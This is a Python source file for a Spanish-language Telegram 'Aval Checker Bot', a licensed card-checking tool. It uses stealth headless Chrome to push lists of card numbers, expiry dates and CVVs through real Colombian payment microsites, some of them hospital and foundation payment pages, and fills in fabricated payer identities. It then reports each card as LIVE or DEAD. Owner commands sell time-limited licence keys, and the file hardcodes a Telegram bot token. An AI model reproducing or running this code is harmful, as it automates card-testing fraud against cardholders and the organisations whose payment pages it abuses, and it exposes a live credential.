#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════╗
║        AVAL CHECKER BOT - CON SISTEMA DE LICENCIAS            ║
║                                                               ║
║  Sistema de keys únicas con expiración                       ║
║  Owner puede generar keys para clientes                      ║
║  Optimizado para Koyeb con ChromeDriver manual               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import logging
import string
import json
import threading
import requests
import subprocess
from datetime import datetime, timedelta
from faker import Faker
from http.server import HTTPServer, BaseHTTPRequestHandler
import asyncio

# ══════════════════════════════════════════════════════════════
# SELENIUM
# ══════════════════════════════════════════════════════════════
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium_stealth import stealth
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import Select
    from selenium.common.exceptions import TimeoutException
except ImportError:
    print("❌ Selenium no instalado")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════════════
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("❌ python-telegram-bot no instalado")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════

BOT_TOKEN = "8764142166:AAHILjxlNWOe-463WVH8bDYx_Z6fxRp9qWY"

# 👑 OWNER ID (TÚ)
OWNER_ID = 7448403516  # Tu Telegram ID

# URLs de Aval
AVAL_URLS = [
    "https://micrositios.avalpaycenter.com/valle-avanza-pago-liquidacion-ma",
    "https://micrositios.avalpaycenter.com/hospital-universitario-san-ig-ma",
    "https://micrositios.avalpaycenter.com/fundacion-sos-sin-fronteras-ma",
    "https://micrositios.avalpaycenter.com/comfamiliar-risaralda-ma",
    "https://micrositios.avalpaycenter.com/campoalto-acesalud-ma",
]

CARDS_PER_URL = 2

# ══════════════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════
# SISTEMA DE LICENCIAS
# ══════════════════════════════════════════════════════════════

class LicenseManager:
    """Gestiona keys de licencia con expiración"""
    
    def __init__(self, db_file='licenses.json'):
        self.db_file = db_file
        self.licenses = self._load_db()
    
    def _load_db(self):
        """Carga la base de datos de licencias"""
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_db(self):
        """Guarda la base de datos"""
        with open(self.db_file, 'w') as f:
            json.dump(self.licenses, f, indent=2)
    
    def generate_key(self, days):
        """Genera una key única alfanumérica"""
        # Formato: AVAL-XXXX-XXXX-XXXX
        chars = string.ascii_uppercase + string.digits
        part1 = ''.join(random.choices(chars, k=4))
        part2 = ''.join(random.choices(chars, k=4))
        part3 = ''.join(random.choices(chars, k=4))
        
        key = f"AVAL-{part1}-{part2}-{part3}"
        
        # Verificar que no exista
        while key in self.licenses:
            part1 = ''.join(random.choices(chars, k=4))
            part2 = ''.join(random.choices(chars, k=4))
            part3 = ''.join(random.choices(chars, k=4))
            key = f"AVAL-{part1}-{part2}-{part3}"
        
        # Guardar key sin activar
        self.licenses[key] = {
            'days': days,
            'created_at': datetime.now().isoformat(),
            'activated': False,
            'user_id': None,
            'activated_at': None,
            'expires_at': None
        }
        
        self._save_db()
        return key
    
    def activate_key(self, key, user_id):
        """Activa una key para un usuario específico"""
        if key not in self.licenses:
            return False, "❌ Key inválida"
        
        lic = self.licenses[key]
        
        # Verificar si ya está activada
        if lic['activated']:
            if lic['user_id'] == user_id:
                # Verificar si expiró
                expires = datetime.fromisoformat(lic['expires_at'])
                if datetime.now() > expires:
                    return False, "❌ Tu licencia expiró"
                
                days_left = (expires - datetime.now()).days
                return True, f"✅ Licencia activa ({days_left} días restantes)"
            else:
                return False, "❌ Esta key ya fue activada por otro usuario"
        
        # Activar key
        now = datetime.now()
        expires = now + timedelta(days=lic['days'])
        
        self.licenses[key]['activated'] = True
        self.licenses[key]['user_id'] = user_id
        self.licenses[key]['activated_at'] = now.isoformat()
        self.licenses[key]['expires_at'] = expires.isoformat()
        
        self._save_db()
        
        return True, f"✅ Licencia activada por {lic['days']} días"
    
    def check_license(self, user_id):
        """Verifica si un usuario tiene licencia válida"""
        # Owner siempre tiene acceso
        if user_id == OWNER_ID:
            return True, "👑 Owner - Acceso total"
        
        # Buscar licencia del usuario
        for key, lic in self.licenses.items():
            if lic['activated'] and lic['user_id'] == user_id:
                expires = datetime.fromisoformat(lic['expires_at'])
                
                if datetime.now() > expires:
                    return False, "❌ Tu licencia expiró. Contacta al vendedor."
                
                days_left = (expires - datetime.now()).days
                hours_left = (expires - datetime.now()).seconds // 3600
                
                return True, f"✅ Licencia activa ({days_left}d {hours_left}h restantes)"
        
        return False, "❌ No tienes licencia. Contacta al vendedor para obtener una."
    
    def list_keys(self, show_all=False):
        """Lista todas las keys (para owner)"""
        result = []
        
        for key, lic in self.licenses.items():
            status = "🟢 Activa" if lic['activated'] else "⚪ Sin activar"
            
            info = f"Key: `{key}`\n"
            info += f"Status: {status}\n"
            info += f"Duración: {lic['days']} días\n"
            
            if lic['activated']:
                expires = datetime.fromisoformat(lic['expires_at'])
                days_left = (expires - datetime.now()).days
                
                if days_left < 0:
                    info += f"⏰ Expirada hace {abs(days_left)} días\n"
                else:
                    info += f"⏰ Expira en {days_left} días\n"
                
                info += f"Usuario ID: `{lic['user_id']}`\n"
            
            info += f"Creada: {lic['created_at'][:10]}\n"
            result.append(info)
        
        return result if result else ["No hay keys generadas"]
    
    def revoke_key(self, key):
        """Revoca/elimina una key"""
        if key in self.licenses:
            del self.licenses[key]
            self._save_db()
            return True
        return False

# Instancia global
license_mgr = LicenseManager()

# ══════════════════════════════════════════════════════════════
# CHROMEDRIVER SETUP PARA KOYEB
# ══════════════════════════════════════════════════════════════

def setup_chromedriver():
    """Configura ChromeDriver manualmente para evitar errores de webdriver_manager"""
    try:
        # Intentar usar chromedriver del sistema
        result = subprocess.run(['which', 'chromedriver'], 
                              capture_output=True, 
                              text=True)
        
        if result.returncode == 0:
            chromedriver_path = result.stdout.strip()
            logger.info(f"✅ ChromeDriver encontrado: {chromedriver_path}")
            return chromedriver_path
        
        # Si no está en el PATH, intentar ubicaciones comunes
        common_paths = [
            '/usr/bin/chromedriver',
            '/usr/local/bin/chromedriver',
            '/app/.chromedriver/bin/chromedriver'  # Koyeb buildpack
        ]
        
        for path in common_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                logger.info(f"✅ ChromeDriver encontrado: {path}")
                return path
        
        logger.error("❌ ChromeDriver no encontrado")
        return None
        
    except Exception as e:
        logger.error(f"❌ Error buscando ChromeDriver: {e}")
        return None

# ══════════════════════════════════════════════════════════════
# ESTADO GLOBAL
# ══════════════════════════════════════════════════════════════

fake = Faker('es_ES')

class BotState:
    def __init__(self):
        self.checking = {}  # user_id -> bool
        self.stats = {}     # user_id -> stats
        self.chromedriver_path = None

state = BotState()

# ══════════════════════════════════════════════════════════════
# FUNCIONES AUXILIARES DE VERIFICACIÓN
# ══════════════════════════════════════════════════════════════

# URLs de Aval
URL_AVAL = "https://micrositios.avalpaycenter.com/valle-avanza-pago-liquidacion-ma"

def generate_random_email():
    """Genera email aleatorio"""
    return fake.email()

def generate_random_phone():
    """Genera teléfono colombiano aleatorio"""
    return f"3{random.randint(10,59)}{random.randint(1000000,9999999)}"

def generate_random_document():
    """Genera cédula colombiana aleatoria"""
    return str(random.randint(10000000, 99999999))

def create_chrome_driver():
    """Crea instancia de Chrome WebDriver con configuración optimizada para Koyeb"""
    try:
        options = webdriver.ChromeOptions()
        
        # Configuración headless para servidor
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-software-rasterizer')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-infobars')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--start-maximized')
        
        # User agent realista
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Preferencias para evitar detección
        prefs = {
            'credentials_enable_service': False,
            'profile.password_manager_enabled': False,
            'profile.default_content_setting_values.notifications': 2,
            'profile.managed_default_content_settings.images': 2  # Deshabilitar imágenes para velocidad
        }
        options.add_experimental_option('prefs', prefs)
        options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Configurar ChromeDriver
        if state.chromedriver_path:
            service = Service(executable_path=state.chromedriver_path)
            logger.info(f"🚀 Usando ChromeDriver: {state.chromedriver_path}")
        else:
            # Fallback: dejar que Selenium lo encuentre
            service = Service()
            logger.info("🚀 Usando ChromeDriver del sistema")
        
        # Crear driver
        driver = webdriver.Chrome(service=service, options=options)
        
        # Aplicar stealth
        stealth(driver,
            languages=["es-ES", "es"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True,
        )
        
        # Configurar timeouts
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)
        
        logger.info("✅ Chrome driver creado exitosamente")
        return driver
        
    except Exception as e:
        logger.error(f"❌ Error creando Chrome driver: {e}")
        raise

def type_into(driver, wait, by, selector, text):
    """Escribe en un campo de forma segura"""
    try:
        field = wait.until(EC.element_to_be_clickable((by, selector)))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", field)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", field)
        time.sleep(0.3)
        field.clear()
        time.sleep(0.1)
        
        # Escribir texto con delay natural
        for ch in text:
            field.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
        
        return True
    except Exception as e:
        logger.error(f"Error escribiendo en {selector}: {e}")
        return False

def safe_click(driver, wait, selector, by):
    """Hace clic de forma segura"""
    try:
        btn = wait.until(EC.element_to_be_clickable((by, selector)))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        time.sleep(0.3)
        driver.execute_script("arguments[0].click();", btn)
        time.sleep(0.5)
        return True
    except Exception as e:
        logger.error(f"Error haciendo clic en {selector}: {e}")
        return False

def clear_browser(driver):
    """Limpia cookies y caché del navegador"""
    try:
        driver.execute_cdp_cmd("Network.clearBrowserCookies", {})
        driver.execute_cdp_cmd("Network.clearBrowserCache", {})
        driver.delete_all_cookies()
        driver.execute_script("""
            try { window.localStorage.clear(); } catch(e) {}
            try { window.sessionStorage.clear(); } catch(e) {}
        """)
        logger.info("🧹 Navegador limpiado")
    except Exception as e:
        logger.warning(f"⚠️ Error limpiando navegador: {e}")

def detect_result(driver):
    """Detecta el resultado del pago"""
    logger.info("🔍 Esperando resultado de transacción...")
    time.sleep(12)
    
    # Buscar mensajes de rechazo
    declined_xpaths = [
        "//h3[contains(text(), 'Negada')]",
        "//h3[contains(text(), 'SCUDO')]",
        "//h3[contains(text(), 'rechazada')]",
        "//*[contains(text(),'Transacción Rechazada')]",
        "//*[contains(text(),'no autorizada')]",
        "//*[contains(text(),'Tarjeta inválida')]",
    ]
    
    for xpath in declined_xpaths:
        try:
            el = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.XPATH, xpath)))
            msg = el.text.strip()
            logger.info(f"❌ Transacción rechazada: {msg}")
            return "DEAD", msg
        except TimeoutException:
            continue
    
    # Si no hay mensaje de rechazo, considerar LIVE
    logger.info("✅ No se detectó rechazo - Posible LIVE")
    return "LIVE", "Transacción procesada exitosamente"

def gateway_email_step(driver, wait, email):
    """Paso: ingresar email en el gateway"""
    logger.info("📧 Ingresando email...")
    if type_into(driver, wait, By.ID, 'email', email):
        return safe_click(driver, wait, '//button[@aria-label="Continuar" or contains(.,"Continuar")]', By.XPATH)
    return False

def gateway_select_card(driver, wait):
    """Seleccionar método de pago: tarjeta"""
    logger.info("💳 Seleccionando método de pago...")
    try:
        wait.until(EC.presence_of_element_located(
            (By.XPATH, "//h2[contains(text(), 'Selecciona un método de pago')]")))
        time.sleep(1)
        return safe_click(driver, wait, "//button[.//span[contains(text(),'Tarjeta de Crédito')]]", By.XPATH)
    except Exception as e:
        logger.error(f"Error seleccionando tarjeta: {e}")
        return False

def gateway_card_fields(driver, wait, card_number, expiry, cvv):
    """Rellenar datos de tarjeta"""
    logger.info("🔢 Ingresando datos de tarjeta...")
    
    if not type_into(driver, wait, By.ID, 'cardNumber', card_number):
        return False
    time.sleep(0.3)
    
    if not type_into(driver, wait, By.ID, 'date', expiry):
        return False
    time.sleep(0.3)
    
    if not type_into(driver, wait, By.ID, 'cvv', cvv):
        return False
    time.sleep(0.5)
    
    return safe_click(driver, wait, 'button.btn[type="submit"]', By.CSS_SELECTOR)

def gateway_titular(driver, wait, name, surname, doc, phone):
    """Rellenar datos del titular"""
    logger.info("👤 Ingresando datos del titular...")
    
    if not type_into(driver, wait, By.ID, 'name', name):
        return False
    time.sleep(0.2)
    
    if not type_into(driver, wait, By.ID, 'surname', surname):
        return False
    time.sleep(0.2)
    
    # Cédula
    try:
        doc_field = wait.until(EC.element_to_be_clickable((By.ID, 'document')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", doc_field)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", doc_field)
        time.sleep(0.3)
        doc_field.clear()
        time.sleep(0.1)
        
        for ch in doc:
            doc_field.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
    except Exception as e:
        logger.error(f"Error en documento: {e}")
        return False
    
    # Teléfono
    try:
        time.sleep(0.3)
        pf = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="user.mobile"]')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", pf)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", pf)
        time.sleep(0.3)
        pf.clear()
        time.sleep(0.1)
        
        for ch in phone:
            pf.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
    except Exception as e:
        logger.warning(f"⚠️ Error en teléfono: {e}")
    
    return True

def gateway_pay_button(driver, wait):
    """Clic en botón de pagar"""
    logger.info("💰 Procesando pago...")
    try:
        btn = wait.until(EC.element_to_be_clickable(
            (By.CSS_SELECTOR, 'button[type="submit"][aria-label*="Pagar"]')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        time.sleep(0.5)
        driver.execute_script("arguments[0].click();", btn)
        return True
    except Exception:
        # Fallback: buscar cualquier botón submit visible
        try:
            btns = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"]')
            for btn in btns:
                if btn.is_displayed() and btn.is_enabled():
                    driver.execute_script("arguments[0].click();", btn)
                    logger.info("✅ Clic en botón pagar (fallback)")
                    return True
        except Exception as e:
            logger.error(f"Error en botón pagar: {e}")
            return False
    return False

def process_card_aval(driver, wait, card_number, expiry, cvv):
    """Procesa verificación de tarjeta en Aval"""
    email = generate_random_email()
    phone = generate_random_phone()
    doc = generate_random_document()
    name = fake.first_name()
    surname = fake.last_name()
    
    logger.info(f"🚀 Iniciando verificación - Email: {email}")
    
    try:
        # Limpiar navegador
        clear_browser(driver)
        
        # Navegar a Aval
        logger.info(f"🌐 Navegando a: {URL_AVAL}")
        driver.get(URL_AVAL)
        time.sleep(5)
        
        # Llenar formulario Aval
        logger.info("📝 Llenando formulario Aval...")
        
        if not type_into(driver, wait, By.ID, 'decripcion_pago', "PAGO NOMINA"):
            return "ERROR", "Error en descripción pago"
        
        if not type_into(driver, wait, By.ID, 'description', "AlexisSAS"):
            return "ERROR", "Error en description"
        
        if not type_into(driver, wait, By.ID, 'numero_liquidacion', fake.numerify('########')):
            return "ERROR", "Error en número liquidación"
        
        if not type_into(driver, wait, By.ID, 'reference', fake.numerify('########')):
            return "ERROR", "Error en referencia"
        
        if not type_into(driver, wait, By.ID, 'amount', "10000"):
            return "ERROR", "Error en monto"
        
        # Seleccionar moneda
        try:
            Select(wait.until(EC.presence_of_element_located(
                (By.ID, 'currency')))).select_by_visible_text('Peso colombiano')
            time.sleep(0.3)
        except Exception as e:
            logger.warning(f"⚠️ Error seleccionando moneda: {e}")
        
        if not type_into(driver, wait, By.ID, 'payer_email', email):
            return "ERROR", "Error en email pagador"
        
        if not type_into(driver, wait, By.ID, 'buyer_cell_phone', phone):
            return "ERROR", "Error en teléfono"
        
        # Botón Pagar
        logger.info("🔘 Clic en botón Pagar...")
        if not safe_click(driver, wait, "//button[normalize-space()='Pagar' or @aria-label='Pagar']", By.XPATH):
            return "ERROR", "Error en botón Pagar"
        
        time.sleep(3)
        
        # Gateway de pago
        if not gateway_email_step(driver, wait, email):
            return "ERROR", "Error en paso email gateway"
        
        time.sleep(2)
        
        if not gateway_select_card(driver, wait):
            return "ERROR", "Error seleccionando tarjeta"
        
        time.sleep(2)
        
        if not gateway_card_fields(driver, wait, card_number, expiry, cvv):
            return "ERROR", "Error en campos de tarjeta"
        
        time.sleep(2)
        
        if not gateway_titular(driver, wait, name, surname, doc, phone):
            return "ERROR", "Error en datos del titular"
        
        time.sleep(1)
        
        if not gateway_pay_button(driver, wait):
            return "ERROR", "Error en botón pagar final"
        
        # Detectar resultado
        return detect_result(driver)
        
    except Exception as e:
        logger.error(f"❌ Error crítico en verificación: {e}")
        return "ERROR", str(e)

# ══════════════════════════════════════════════════════════════
# DECORADOR DE AUTENTICACIÓN
# ══════════════════════════════════════════════════════════════

def require_license(func):
    """Decorador para verificar licencia antes de ejecutar comando"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        valid, msg = license_mgr.check_license(user_id)
        
        if not valid:
            await update.message.reply_text(
                f"{msg}\n\n"
                f"💬 Contacta al owner para obtener una licencia.",
                parse_mode='Markdown'
            )
            return
        
        return await func(update, context)
    
    return wrapper

# ══════════════════════════════════════════════════════════════
# COMANDOS DEL OWNER
# ══════════════════════════════════════════════════════════════

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generar key (solo owner)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede generar keys")
        return
    
    # Verificar argumentos
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso incorrecto\n\n"
            "**Genera keys:**\n"
            "`/genkey 1` - Key de 1 día\n"
            "`/genkey 7` - Key de 7 días\n"
            "`/genkey 30` - Key de 30 días",
            parse_mode='Markdown'
        )
        return
    
    try:
        days = int(context.args[0])
        
        if days not in [1, 7, 30]:
            await update.message.reply_text(
                "❌ Solo puedes generar keys de:\n"
                "• 1 día\n"
                "• 7 días\n"
                "• 30 días"
            )
            return
        
        key = license_mgr.generate_key(days)
        
        await update.message.reply_text(
            f"✅ **Key generada**\n\n"
            f"🔑 `{key}`\n"
            f"⏰ Duración: {days} días\n"
            f"📊 Status: Sin activar\n\n"
            f"Envía esta key al cliente para que la active con:\n"
            f"`/redeem {key}`",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Debes especificar un número")

async def listkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Listar keys (solo owner)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede listar keys")
        return
    
    keys = license_mgr.list_keys()
    
    message = "📋 **LISTADO DE KEYS**\n\n"
    
    for i, key_info in enumerate(keys[:10], 1):  # Máximo 10 por mensaje
        message += f"**{i}.**\n{key_info}\n"
    
    if len(keys) > 10:
        message += f"\n_(Mostrando 10 de {len(keys)} keys)_"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Revocar key (solo owner)"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede revocar keys")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso: `/revoke AVAL-XXXX-XXXX-XXXX`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0]
    
    if license_mgr.revoke_key(key):
        await update.message.reply_text(f"✅ Key `{key}` revocada", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ Key `{key}` no encontrada", parse_mode='Markdown')

# ══════════════════════════════════════════════════════════════
# COMANDOS DE USUARIO
# ══════════════════════════════════════════════════════════════

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mensaje de bienvenida"""
    user_id = update.effective_user.id
    
    msg = (
        "👋 **Bienvenido a Aval Checker Bot**\n\n"
        "🔐 Este bot requiere licencia para funcionar.\n\n"
    )
    
    valid, status = license_mgr.check_license(user_id)
    
    if valid:
        msg += f"{status}\n\n"
        msg += (
            "**Comandos disponibles:**\n"
            "`/check` - Verificar tarjetas\n"
            "`/status` - Ver tus estadísticas\n"
            "`/mykey` - Info de tu licencia\n"
            "`/help` - Ayuda completa"
        )
    else:
        msg += (
            "❌ No tienes licencia activa.\n\n"
            "**Para obtener acceso:**\n"
            "1. Contacta al vendedor\n"
            "2. Obtén una key de licencia\n"
            "3. Actívala con: `/redeem TU-KEY`"
        )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activar una key de licencia"""
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso: `/redeem AVAL-XXXX-XXXX-XXXX`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0]
    
    success, message = license_mgr.activate_key(key, user_id)
    
    if success:
        await update.message.reply_text(
            f"🎉 {message}\n\n"
            f"Ya puedes usar:\n"
            f"`/check` - Verificar tarjetas\n"
            f"`/status` - Ver estadísticas\n"
            f"`/help` - Ayuda",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(message, parse_mode='Markdown')

async def mykey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ver info de la licencia actual"""
    user_id = update.effective_user.id
    
    valid, message = license_mgr.check_license(user_id)
    
    await update.message.reply_text(message, parse_mode='Markdown')

@require_license
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Checkear tarjeta (requiere licencia)"""
    user_id = update.effective_user.id
    
    text = update.message.text.replace('/check', '').strip()
    
    if not text:
        await update.message.reply_text(
            "❌ Formato: `/check CC|MM|YY|CVV`\n\n"
            "**Ejemplo:**\n"
            "`/check 5424181655740251|03|28|532`",
            parse_mode='Markdown'
        )
        return
    
    # Inicializar stats
    if user_id not in state.stats:
        state.stats[user_id] = {'total': 0, 'lives': 0, 'dead': 0, 'errors': 0}
    
    lines = text.strip().split('\n')
    cards = []
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split('|')
        if len(parts) != 4:
            await update.message.reply_text(f"❌ Formato incorrecto: `{line}`", parse_mode='Markdown')
            return
        
        cc, mm, yy, cvv = [p.strip() for p in parts]
        mm = mm.zfill(2)
        
        if len(cc) < 13 or len(cvv) < 3:
            await update.message.reply_text(f"❌ Tarjeta inválida", parse_mode='Markdown')
            return
        
        cards.append((cc, mm, yy, cvv))
    
    if not cards:
        await update.message.reply_text("❌ No hay tarjetas válidas")
        return
    
    await update.message.reply_text(f"✅ Checking {len(cards)} tarjeta(s)...")
    
    # Inicializar driver de Selenium
    driver = None
    try:
        logger.info(f"👤 Usuario {user_id} iniciando check de {len(cards)} tarjeta(s)")
        driver = create_chrome_driver()
        wait = WebDriverWait(driver, 25)
        
        for cc, mm, yy, cvv in cards:
            masked = f"{cc[:4]}****{cc[-4:]}"
            expiry = f"{mm}/{yy}"
            
            await update.message.reply_text(
                f"🔄 Checking: `{masked}`",
                parse_mode='Markdown'
            )
            
            # Verificación REAL con Selenium
            result, message = process_card_aval(driver, wait, cc, expiry, cvv)
            
            state.stats[user_id]['total'] += 1
            
            if result == 'LIVE':
                state.stats[user_id]['lives'] += 1
                await update.message.reply_text(
                    f"✅ **LIVE** - `{masked}`\n"
                    f"💳 `{cc}|{mm}|{yy}|{cvv}`\n"
                    f"📝 {message}\n"
                    f"⚡ Gateway: Aval [$10.000]",
                    parse_mode='Markdown'
                )
            elif result == 'DEAD':
                state.stats[user_id]['dead'] += 1
                await update.message.reply_text(
                    f"❌ **DEAD** - `{masked}`\n"
                    f"📝 {message}",
                    parse_mode='Markdown'
                )
            else:
                state.stats[user_id]['errors'] += 1
                await update.message.reply_text(
                    f"⚠️ **ERROR** - `{masked}`\n"
                    f"📝 {message}",
                    parse_mode='Markdown'
                )
    
    except Exception as e:
        logger.error(f"❌ Error crítico en checking: {e}", exc_info=True)
        await update.message.reply_text(
            f"⚠️ Error: {str(e)}",
            parse_mode='Markdown'
        )
    finally:
        if driver:
            try:
                driver.quit()
                logger.info("🔒 Driver cerrado")
            except Exception as e:
                logger.error(f"Error cerrando driver: {e}")

@require_license
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ver estadísticas (requiere licencia)"""
    user_id = update.effective_user.id
    
    if user_id not in state.stats:
        state.stats[user_id] = {'total': 0, 'lives': 0, 'dead': 0, 'errors': 0}
    
    stats = state.stats[user_id]
    
    msg = (
        f"📊 **TUS ESTADÍSTICAS**\n\n"
        f"✅ Lives: {stats['lives']}\n"
        f"❌ Dead: {stats['dead']}\n"
        f"⚠️ Errors: {stats['errors']}\n"
        f"📈 Total: {stats['total']}"
    )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ayuda"""
    msg = (
        "📖 **AYUDA - AVAL CHECKER BOT**\n\n"
        "**Activar licencia:**\n"
        "`/redeem AVAL-XXXX-XXXX-XXXX`\n\n"
        "**Checkear tarjetas:**\n"
        "`/check 4111111111111111|12|25|123`\n\n"
        "**Ver info:**\n"
        "`/mykey` - Tu licencia\n"
        "`/status` - Tus stats\n"
        "`/start` - Menú principal\n\n"
        "**Soporte:**\n"
        "Contacta al owner para obtener licencias"
    )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

# ══════════════════════════════════════════════════════════════
# HEALTH CHECK HTTP SERVER
# ══════════════════════════════════════════════════════════════

class HealthCheckHandler(BaseHTTPRequestHandler):
    """Servidor HTTP simple para health checks de Koyeb"""
    
    def do_GET(self):
        """Responder OK a todas las peticiones GET"""
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        response = f'OK - Bot running - ChromeDriver: {state.chromedriver_path or "system"}'
        self.wfile.write(response.encode())
    
    def log_message(self, format, *args):
        """Silenciar logs del servidor HTTP"""
        pass

def start_health_server():
    """Iniciar servidor HTTP en puerto 8000 en background"""
    try:
        server = HTTPServer(('0.0.0.0', 8000), HealthCheckHandler)
        logger.info("✅ Health check server iniciado en puerto 8000")
        server.serve_forever()
    except Exception as e:
        logger.error(f"❌ Error en health server: {e}")

# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def main():
    if BOT_TOKEN == "TU_BOT_TOKEN_AQUI":
        print("❌ Configura BOT_TOKEN")
        sys.exit(1)
    
    print("=" * 70)
    print("🤖 AVAL CHECKER BOT - INICIANDO")
    print("=" * 70)
    
    # Configurar ChromeDriver
    print("🔧 Configurando ChromeDriver...")
    state.chromedriver_path = setup_chromedriver()
    
    if state.chromedriver_path:
        print(f"✅ ChromeDriver listo: {state.chromedriver_path}")
    else:
        print("⚠️ ChromeDriver no encontrado, usando modo automático")
    
    # Iniciar health check server en background
    health_thread = threading.Thread(target=start_health_server, daemon=True)
    health_thread.start()
    time.sleep(1)
    
    print(f"👑 Owner ID: {OWNER_ID}")
    print("=" * 70)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Comandos owner
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("listkeys", listkeys_command))
    app.add_handler(CommandHandler("revoke", revoke_command))
    
    # Comandos usuario
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("mykey", mykey_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ Bot activo con sistema de licencias")
    print("💡 Usa /genkey para generar keys")
    print("=" * 70)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
